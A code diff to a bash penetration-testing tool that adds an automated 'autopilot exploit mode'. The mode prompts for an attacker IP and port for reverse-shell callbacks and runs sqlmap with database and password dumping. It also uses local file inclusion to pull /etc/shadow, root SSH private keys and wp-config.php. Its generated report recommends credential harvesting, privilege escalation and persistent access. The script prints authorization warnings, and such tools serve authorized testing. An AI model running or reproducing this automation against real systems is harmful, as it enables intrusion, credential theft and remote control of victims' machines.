@@ -550,8 +550,10 @@ autopilot_exploit_mode() {
     fi
 
     log_section "AUTOPILOT EXPLOIT MODE"
-    log_warning "This will attempt to exploit discovered vulnerabilities"
-    log_warning "Ensure you have authorization before proceeding!"
+    log_warning "This will attempt to EXPLOIT discovered vulnerabilities"
+    log_warning "This includes REVERSE SHELLS and POST-EXPLOITATION"
+    log_warning "Ensure you have EXPLICIT AUTHORIZATION before proceeding!"
+    log_warning "All exploitation attempts will be logged for audit trail"
     echo
 
     if ! confirm "Proceed with exploitation attempts?" "n"; then
@@ -559,15 +561,52 @@ autopilot_exploit_mode() {
         return 0
     fi
 
+    # Get attacker IP for reverse shells
+    log_info "Enter your IP address for reverse shell callbacks:"
+    read -r attacker_ip
+    log_info "Enter port for reverse shell listener (default: 4444):"
+    read -r attacker_port
+    attacker_port=${attacker_port:-4444}
+
+    log_info "Attacker IP: $attacker_ip"
+    log_info "Listener Port: $attacker_port"
+
+    if ! confirm "Confirm these settings?" "n"; then
+        log_info "Exploit mode cancelled"
+        return 0
+    fi
+
+    # Load exploitation modules
+    local exploit_modules_dir="$(dirname "${BASH_SOURCE[0]}")/../modules/exploitation"
+    if [ -f "${exploit_modules_dir}/rce_exploit.sh" ]; then
+        source "${exploit_modules_dir}/rce_exploit.sh"
+        log_debug "Loaded RCE exploitation module"
+    fi
+    if [ -f "${exploit_modules_dir}/post_exploit.sh" ]; then
+        source "${exploit_modules_dir}/post_exploit.sh"
+        log_debug "Loaded post-exploitation module"
+    fi
+
     # Get exploitable findings
     local exploitable=$(sqlite3 "$DB_PATH" <<EOF
-SELECT f.id, f.type, f.title, t.hostname, t.ip
+SELECT f.id, f.type, f.title, f.description, t.hostname, t.ip, t.port
 FROM findings f
 JOIN targets t ON t.id = f.target_id
 WHERE f.project_id = $project_id
 AND f.severity IN ('critical', 'high')
-AND f.type IN ('sql-injection', 'rce', 'command-injection', 'file-upload')
-ORDER BY f.severity;
+AND f.type IN ('sqli_error_based', 'sqli_boolean_blind', 'sqli_time_blind', 'sqli_union_based',
+               'rce_command_injection', 'rce_command_injection_output', 'rce_code_injection',
+               'rce_ssti', 'rce_file_disclosure', 'lfi_confirmed', 'file-upload')
+ORDER BY
+    CASE f.type
+        WHEN 'rce_command_injection' THEN 1
+        WHEN 'rce_command_injection_output' THEN 1
+        WHEN 'rce_code_injection' THEN 2
+        WHEN 'rce_ssti' THEN 3
+        WHEN 'sqli_error_based' THEN 4
+        WHEN 'sqli_union_based' THEN 5
+        ELSE 6
+    END;
 EOF
 )
 
@@ -576,26 +615,230 @@ EOF
         return 0
     fi
 
-    echo "$exploitable" | while IFS='|' read -r finding_id vuln_type title hostname ip; do
-        log_info "Attempting exploitation: $title"
+    local total_findings=$(echo "$exploitable" | wc -l)
+    local current=0
+    local exploited=0
 
+    echo "$exploitable" | while IFS='|' read -r finding_id vuln_type title description hostname ip port; do
+        current=$((current + 1))
+
+        log_section "Exploiting Finding $current/$total_findings"
+        log_info "ID: $finding_id"
+        log_info "Type: $vuln_type"
+        log_info "Title: $title"
+        echo
+
+        # Build target URL
         local target=""
-        [ -n "$hostname" ] && target="$hostname"
-        [ -z "$target" ] && [ -n "$ip" ] && target="$ip"
+        if [ -n "$hostname" ]; then
+            if [ -n "$port" ] && [ "$port" != "80" ] && [ "$port" != "443" ]; then
+                target="${hostname}:${port}"
+            else
+                target="$hostname"
+            fi
+        elif [ -n "$ip" ]; then
+            if [ -n "$port" ]; then
+                target="${ip}:${port}"
+            else
+                target="$ip"
+            fi
+        fi
+
+        # Add protocol
+        if [ "$port" = "443" ]; then
+            target="https://$target"
+        else
+            target="http://$target"
+        fi
+
+        # Extract parameter from description
+        local parameter=$(echo "$description" | grep -oP 'Parameter:\s*\K\S+' | head -1)
+        local url=$(echo "$description" | grep -oP 'URL:\s*\K\S+' | head -1)
+
+        [ -z "$url" ] && url="$target"
+
+        log_info "Target URL: $url"
+        log_info "Parameter: $parameter"
 
         # Attempt exploitation based on vulnerability type
         case "$vuln_type" in
-            sql-injection)
-                log_info "Running SQLMap with aggressive options"
-                run_tool "sqlmap" "$target" "--batch --level=5 --risk=3"
+            sqli_*|sql-injection)
+                log_info "[Exploit] Launching SQLMap for SQL injection exploitation"
+
+                # Run SQLMap with aggressive options
+                local sqlmap_output="data/projects/${project_id}/exploits/sqlmap_${finding_id}"
+                mkdir -p "$sqlmap_output"
+
+                if command -v sqlmap &> /dev/null; then
+                    sqlmap -u "$url" \
+                           --batch \
+                           --level=5 \
+                           --risk=3 \
+                           --technique=BEUSTQ \
+                           --dbms=all \
+                           --threads=5 \
+                           --random-agent \
+                           --output-dir="$sqlmap_output" \
+                           --dump \
+                           --passwords \
+                           2>&1 | tee "${sqlmap_output}/sqlmap.log"
+
+                    log_success "[Exploit] SQLMap completed. Check: $sqlmap_output"
+                    exploited=$((exploited + 1))
+                else
+                    log_warn "[Exploit] SQLMap not installed"
+                fi
                 ;;
+
+            rce_*|command-injection|rce)
+                log_critical "[Exploit] Attempting RCE exploitation with reverse shells"
+
+                if [ -n "$parameter" ]; then
+                    # Call RCE exploitation module
+                    if exploit_rce "$finding_id" "$url" "$parameter" "$project_id" "$attacker_ip" "$attacker_port"; then
+                        log_critical "[Exploit] RCE exploitation successful!"
+
+                        # Proceed to post-exploitation
+                        log_info "[Exploit] Starting post-exploitation phase..."
+
+                        if confirm "Run post-exploitation enumeration?" "y"; then
+                            post_exploit "$url" "$parameter" "$project_id"
+                            log_success "[Exploit] Post-exploitation completed"
+                        fi
+
+                        exploited=$((exploited + 1))
+                    else
+                        log_warn "[Exploit] RCE exploitation failed"
+                    fi
+                else
+                    log_warn "[Exploit] No parameter found for RCE exploitation"
+                fi
+                ;;
+
+            lfi_confirmed|lfi)
+                log_info "[Exploit] LFI exploitation - attempting to read sensitive files"
+
+                if [ -n "$parameter" ]; then
+                    local lfi_output="data/projects/${project_id}/exploits/lfi_${finding_id}"
+                    mkdir -p "$lfi_output"
+
+                    # Try to read sensitive files
+                    local sensitive_files=(
+                        "/etc/passwd"
+                        "/etc/shadow"
+                        "/etc/hosts"
+                        "/etc/apache2/apache2.conf"
+                        "/var/www/html/wp-config.php"
+                        "/home/user/.ssh/id_rsa"
+                        "/root/.ssh/id_rsa"
+                    )
+
+                    for file in "${sensitive_files[@]}"; do
+                        log_info "[Exploit] Reading: $file"
+
+                        # Build LFI URL
+                        local lfi_url
+                        if [[ "$url" == *"?"* ]]; then
+                            lfi_url="${url}&${parameter}=${file}"
+                        else
+                            lfi_url="${url}?${parameter}=${file}"
+                        fi
+
+                        local response=$(curl -s -L --max-time 10 "$lfi_url")
+
+                        # Save if we got content
+                        if [ -n "$response" ] && [ ${#response} -gt 50 ]; then
+                            local filename=$(echo "$file" | tr '/' '_')
+                            echo "$response" > "${lfi_output}/${filename}.txt"
+                            log_success "[Exploit] Saved: ${filename}.txt"
+                        fi
+                    done
+
+                    log_success "[Exploit] LFI exploitation completed. Check: $lfi_output"
+                    exploited=$((exploited + 1))
+                else
+                    log_warn "[Exploit] No parameter found for LFI exploitation"
+                fi
+                ;;
+
+            file-upload)
+                log_info "[Exploit] File upload exploitation - attempting web shell upload"
+                log_warn "[Exploit] Manual intervention required for file upload exploitation"
+                # This would require detecting the upload form and submitting a shell
+                # Too complex for full automation, but we can provide guidance
+                ;;
+
             *)
-                log_info "No automated exploit available for $vuln_type"
+                log_info "[Exploit] No automated exploit available for $vuln_type"
                 ;;
         esac
 
-        sleep 5
+        sleep 3
+        echo
     done
 
-    log_success "Exploitation attempts completed"
+    log_section "EXPLOITATION SUMMARY"
+    log_info "Total findings attempted: $total_findings"
+    log_success "Successfully exploited: $exploited"
+    log_success "Exploitation completed"
+
+    # Generate exploitation report
+    generate_exploitation_report "$project_id"
+}
+
+# Generate exploitation report
+generate_exploitation_report() {
+    local project_id=$1
+
+    local exploit_dir="data/projects/${project_id}/exploits"
+    local report_file="${exploit_dir}/exploitation_report.md"
+
+    mkdir -p "$exploit_dir"
+
+    cat > "$report_file" <<EOF
+# Exploitation Report
+**Generated:** $(date)
+**Project ID:** $project_id
+
+## Summary
+
+This report documents all exploitation attempts performed by LeKnight autopilot exploit mode.
+
+## Exploitation Results
+
+### SQL Injection Exploits
+$(ls -1 "${exploit_dir}"/sqlmap_* 2>/dev/null | while read -r dir; do
+    echo "- $(basename "$dir")"
+    [ -f "$dir/sqlmap.log" ] && echo "  - Log: $dir/sqlmap.log"
+done)
+
+### RCE Exploits
+$(ls -1d "${exploit_dir}"/rce_* 2>/dev/null | while read -r dir; do
+    echo "- $(basename "$dir")"
+    [ -f "$dir/bash_exploit_success.txt" ] && echo "  - Bash shell: SUCCESS"
+    [ -f "$dir/python_exploit_success.txt" ] && echo "  - Python shell: SUCCESS"
+done)
+
+### Post-Exploitation
+$(ls -1 "data/projects/${project_id}/exploitation/post_exploit/report.txt" 2>/dev/null | while read -r file; do
+    echo "- Post-exploitation report available"
+done)
+
+## Files Generated
+
+\`\`\`
+$(find "$exploit_dir" -type f 2>/dev/null)
+\`\`\`
+
+## Next Steps
+
+1. Review all harvested credentials
+2. Attempt privilege escalation on compromised systems
+3. Establish persistent access (if authorized)
+4. Document all findings for client report
+
+**WARNING:** All exploitation was performed under authorization. Maintain audit trail.
+EOF
+
+    log_success "Exploitation report generated: $report_file"
 }
